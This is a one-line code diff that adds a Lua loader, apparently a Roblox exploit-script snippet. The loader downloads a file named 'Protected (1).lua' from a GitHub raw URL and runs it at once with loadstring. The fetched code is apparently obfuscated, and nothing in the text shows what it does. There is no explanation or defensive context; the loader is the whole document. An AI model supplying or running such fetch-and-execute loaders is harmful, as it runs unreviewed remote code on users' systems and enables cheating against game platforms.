@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/RIPKoala/ytszSD/main/Protected%20(1).lua'),true))()
